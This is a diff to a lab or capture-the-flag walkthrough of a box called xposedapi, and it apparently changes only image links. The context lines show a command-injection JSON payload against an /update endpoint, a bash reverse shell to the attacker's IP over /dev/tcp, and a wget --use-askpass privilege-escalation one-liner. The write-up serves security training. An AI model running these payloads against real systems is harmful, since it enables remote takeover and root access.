@@ -21,13 +21,13 @@ This box likely has some API exploitation, so we can start proxying traffic thro
 
 Port 13337 shows some basic documentation for an API:
 
-![](<../../../.gitbook/assets/image%20(3625).png>)
+![](../../../.gitbook/assets/xposedapi-4.png)
 
 The most interesting was the `/update` endpoint, which accepted a user-controlled URL and says it updates the application via a 'Linux Executable'. This might be vulnerable to RCE if we can chain commands to the end of the URL.
 
 But we didn't have a username yet. There's also a `/logs` endpoint:
 
-![](<../../../.gitbook/assets/image%20(2572).png>)
+![](../../../.gitbook/assets/xposedapi-2.png)
 
 Attempting to visit it results in a WAF blocking us:
 
@@ -76,9 +76,9 @@ clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
 
 There's a `clumsyadmin` user present, and this might be the user we need. Then, we can use the `/update` endpoint to send requests to our HTTP server:
 
-![](<../../../.gitbook/assets/image%20(203).png>)
+![](../../../.gitbook/assets/xposedapi-1.png)
 
-![](<../../../.gitbook/assets/image%20(91).png>)
+![](../../../.gitbook/assets/xposedapi-7.png)
 
 Since our parameters was being passed to a 'Linux Executable', I assumed that the URL parameter was not being properly sanitised (and is probably using `wget` or something).
 
@@ -88,7 +88,7 @@ To test, I sent this JSON data:
 {"user":"clumsyadmin","url":"http://192.168.45.184/hiiamssrf; wget 192.168.45.184/hiiamrce"}
 ```
 
-![](<../../../.gitbook/assets/image%20(525).png>)
+![](../../../.gitbook/assets/xposedapi-5.png)
 
 This confirms we have RCE. We can get a reverse shell via this JSON object:
 
@@ -96,7 +96,7 @@ This confirms we have RCE. We can get a reverse shell via this JSON object:
 {"user":"clumsyadmin","url":"http://192.168.45.184/hiiamssrf; bash -c 'bash -i >& /dev/tcp/192.168.45.184/21 0>&1'"}
 ```
 
-![](<../../../.gitbook/assets/image%20(714).png>)
+![](../../../.gitbook/assets/xposedapi-6.png)
 
 ## Privilege Escalation
 
@@ -120,4 +120,4 @@ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
 wget --use-askpass=$TF 0
 ```
 
-![](<../../../.gitbook/assets/image%20(3423).png>)
+![](../../../.gitbook/assets/xposedapi-3.png)
